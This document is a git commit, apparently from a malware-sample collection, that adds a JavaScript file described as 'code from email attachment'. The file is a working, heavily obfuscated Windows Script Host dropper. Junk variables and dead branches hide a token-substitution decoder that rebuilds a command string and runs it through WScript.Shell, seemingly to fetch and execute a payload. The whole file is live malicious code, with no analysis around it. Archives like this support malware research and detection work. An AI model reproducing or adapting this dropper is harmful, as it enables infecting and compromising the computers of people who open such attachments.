6c892fb827733b6ae9bce63ff43cb73542e121b2
Brett Santore <brett.santore@gmail.com>
2016-11-07 09:10:24 -0500

    added code from email attachment

---
+++ ONLINE_15151.js
@@ -0,0 +1,186 @@
+var faqta = ':';
+var alduclo = '-iEuR-';
+var kqifymzofly = typeof document2;
+var upokfem = "c";
+var fnawhyta = 'xGlVT';
+var npybrym = 0;
+var ontyjymk = " ";
+var qugqaz = ';';
+var opliqhib = "lYnO";
+var rifosty = '-eOnHF-';
+var facnedr = "-nMsM-";
+var kgumut = "t";
+var nidadv = "return typeof WScript.Std";
+var ubix = '-brYuK-';
+var ulfyb = "jdJgTK";
+var rezwe = ")";
+var zvamxe = "-iMLpjS-";
+
+function tpalki() {
+	return undefined;
+}
+var urkyfult = "h";
+var esyr = 'bSKmXC';
+var jrukde = "xyly";
+var weza = "-bqXRtC-";
+var ejeknu = "s";
+var ilylo = '\,';
+var mapeze = 'a';
+
+function mykmanjab() {
+	var yhgezk = null;
+	return yhgezk;
+}
+var ychynwox = ".";
+var uxjixgodg = '(';
+var ctawuqelo = "ickoxeci";
+var zlupopf = '^';
+var iveppuz = "gi";
+var yxrimq = "fUaD";
+
+function ihoqdubjy() {
+	return null;
+}
+var kcoko = '=aYyY=';
+var fvawulsi = 'e';
+var egmawfo = "d";
+var ojwol = '-kfVWeU-';
+
+function etome() {
+	var zamtyz = '49259';
+	return zamtyz;
+}
+function olmehlum() {
+	return "amqedociqx";
+}
+var ewog = false;
+var uhaxryhxy = 10;
+var hpakvaw = 'xVSiA';
+var hmeruqre = '-aNgzV-';
+var jjiput = '-';
+var qehezha = "-eYmI-";
+var ybifsub = "w";
+var reglotrikk = '25299';
+var ylsyguxm = "-eAeHT-";
+var wxofma = "=aWyA=";
+var wyfxe = 'm';
+var agwuswurenq = null;
+var vruvhubza = '%';
+var ijizjagtutx = "41088";
+var oppignuwj = '\'';
+var ymazoj = 'uRVgtO';
+var yxsynm = '/';
+var fumek = "-oJQyA-";
+var ozykzi = "xQRaB";
+
+function xnohagfu() {
+	var mbolhafx = '89223';
+	return mbolhafx;
+}
+function gyfdaplown() {
+	var awekl = 'umygvu';
+	return awekl;
+}
+function ikejmy() {
+	return 1;
+}
+function xiguwijo() {
+	var tugod = null;
+	return tugod;
+}
+function raker() {
+	var amic = 36;
+	return amic;
+}
+function wsuxqezv() {
+	var ewehve = "xGlVlYnO=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=jdJglYnOK-kfVWeU--iMLpjS-X-iMLpjS-xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B-i-iMLpjS-uR-xGlVlYnOxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BP-eYmI-O-eYmI---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO--eYmI--iMLpjS-r=--iMLpjS-On-brYuK-F-YyY=-brYuK--iMLpjS--eYmI-Ll-eYmI--kfVWeU--iMLpjS-X-iMLpjS--eYmI-xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B-eYmI-xQR--iMLpjS-On-brYuK-F-B-iMLpjS--eYmI-X-iMLpjS-xGlVlYnO-eYmI-ulYnOI-eYmI-ONP-eYmI-Ol-eYmI-ixGlVlYnOyxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B-eYmI-ByP--iMLpjS-On-brYuK-F-=--iMLpjS-On-brYuK-F-YyY=-eYmI-=--iMLpjS-On-brYuK-F-YyY=xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-BnO-eYmI-p-eYmI-RoFI-eYmI-L-iMLpjS-xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-B--iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-iN-eYmI-jdJglYnOKo--iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO--eYmI-=--iMLpjS-On-brYuK-F-YyY=-eYmI-lYnOYl-eYmI--iMLpjS--eYmI-xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B-eYmI--brYuK--eYmI-IjdJglYnOKjdJglYnOK-iMLpjS-nxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B-oJQyA-N-iMLpjS---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO--eYmI-xQR--iMLpjS-On-brYuK-F-B-eYmI-o-eYmI-bj-iMLpjS-xGlVlYnOlYnO-eYmI-xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BxQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-B=--iMLpjS-On-brYuK-F-YyY=-eYmI-Y=--iMLpjS-On-brYuK-F-YyY=lYnO-iMLpjS--eYmI-=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=-kfVWeU-N-iMLpjS-lYnO-kfVWeU--eYmI---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO--iMLpjS-BxGlVlYnOLi-iMLpjS-NlYnOb=--iMLpjS-On-brYuK-F-YyY=K=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=XxGlVlYnO-kfVWeU--eYmI-jdJglYnOKO-eYmI---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-n-eYmI-Lo--iMLpjS-On-brYuK-F-jdJglYnOKFIl-iMLpjS--eYmI--oJQyA-'-brYuK-lYnOlYnOp-bqXRtC--i-iMLpjS-uR--i-iMLpjS-uR---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO--kfVWeU-jdJglYnOKi=--iMLpjS-On-brYuK-F-YyY=xGlVlYnOonn-iMLpjS-xGlVlYnOlYnO-iMLpjS-jdJglYnOKylYnO-kfVWeU-lYnOop-i-iMLpjS-uR-u=--iMLpjS-On-brYuK-F-YyY=-iMLpjS-r-kfVWeU-p-brYuK-p?f=1-kfVWeU-jdJglYnOK--iMLpjS-On-brYuK-F-lYnO','fUaD--iMLpjS-On-brYuK-F-PPjdJglYnOK--iMLpjS-On-brYuK-F-lYnO--iMLpjS-On-brYuK-F-fUaD-kfVWeU--iMLpjS-X-iMLpjS-'b=--iMLpjS-On-brYuK-F-YyY=K=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=XxGlVlYnO-eYmI-xVSiA-eYmI-=--iMLpjS-On-brYuK-F-YyY=lYnO--iMLpjS-On-brYuK-F--eYmI-RlYnOxQR--iMLpjS-On-brYuK-F-BPrOxGlVlYnO-eYmI--iMLpjS-=--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F-YyY=xQR--iMLpjS-On-brYuK-F-Bn=--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-==--iMLpjS-On-brYuK-F-YyY==--iMLpjS-On-brYuK-F---iMLpjS---iMLpjS-On-brYuK-F--iMLpjS--brYuK-lYnO-y--iMLpjS-On-brYuK-F-=xQR--iMLpjS-On-brYuK-F-BfUaD--iMLpjS-On-brYuK-F-PpjdJglYnOK--iMLpjS-On-brYuK-F-lYnO--iMLpjS-On-brYuK-F-fUaD-kfVWeU--iMLpjS-X-iMLpjS-";
+	var icrasse = [qehezha, ubix, hmeruqre, fumek, weza, yxrimq, hpakvaw, ojwol, opliqhib, fnawhyta, ymazoj, zvamxe, rifosty, ylsyguxm, ulfyb, alduclo, ozykzi, kcoko, wxofma, esyr, facnedr];
+	var akqupo = [zlupopf, urkyfult, oppignuwj, uxjixgodg, faqta, vruvhubza, qugqaz, ychynwox, kgumut, upokfem, ilylo, fvawulsi, mapeze, ybifsub, egmawfo, yxsynm, jjiput, ejeknu, wyfxe, rezwe, ontyjymk];
+	var uwbowu = false;
+	var fexla = new Function(nidadv + "In.AtEndOfStream == 'unknown'")();
+	while (1) {
+		if (!uwbowu) uwbowu = 0;
+		if (uwbowu == icrasse.length) break;
+		var xfursy = icrasse[uwbowu];
+		switch (fexla) {
+		case true:
+			ewehve = ewehve.replace(new RegExp(xfursy, iveppuz), akqupo[uwbowu]);
+			break;
+		}
+		uwbowu++;
+	}
+	return ewehve;
+}
+var udabu = wsuxqezv();
+switch (raker()) {
+case undefined:
+	if (npybrym == 'rcahbitobj') {
+		var qdawov = "67850";
+	}
+	break;
+case null:
+	if (npybrym == 'rcahbitobj') {
+		var qdawov = "67850";
+	}
+	break;
+case "omhykapm":
+	if (npybrym == 'rcahbitobj') {
+		var qdawov = "67850";
+	}
+	break;
+case 36:
+	if (kqifymzofly == 'undefined') {
+		var yjyqyrojl = new ActiveXObject("WScript.Shell");
+		if (ikejmy() === 1) {
+			switch (gyfdaplown()) {
+			case 940:
+				var exupowdylj = "ivsihyqhy";
+				if (exupowdylj === "ivsihyqhy") {
+					if (olmehlum() == 514) {
+						var icxypy = 0;
+						var ulviwa = "28673";
+						sethuvudt = 10;
+						avoze = sethuvudt + ulviwa;
+					}
+				}
+				if (jrukde === "xyly") {
+					var usaztabo = 7;
+					var ahvybhobfapl = usaztabo + reglotrikk;
+					ahvybhobfapl = '7519' + ahvybhobfapl;
+					osybekecr = 77;
+					var xabat = osybekecr + ctawuqelo;
+					xabat = 'mzevk' + xabat;
+					var ttokfawb = 937;
+					var debetlo = null;
+					var zqarelupl = null;
+				}
+				if (ihoqdubjy() === null) {
+					var xumelwynga = 200;
+					pagocusu = "25062";
+					var olovme = 1;
+					var nuqos = pagocusu + olovme;
+					nuqos = nuqos + "43615";
+					var oskoxadi = undefined;
+				}
+				if (uhaxryhxy == 10) {
+					var bafxacme = undefined;
+					var ihejfomam = false;
+					var nhuletudi = "akfetd";
+					var ohimmaxrap = 0;
+					var htajvekyp = "bgiwjumob";
+					var rifagse = 25.05;
+					var atycoxy = rifagse + htajvekyp;
+					atycoxy = "53997" + atycoxy;
+				}
+				break;
+			case 'umygvu':
+				if (xiguwijo() == null) {
+					var tjaqukmucd = 3;
+					yjyqyrojl.run(udabu, ewog);
+				}
+				break;
+			}
+		}
+	}
+	break;
+}
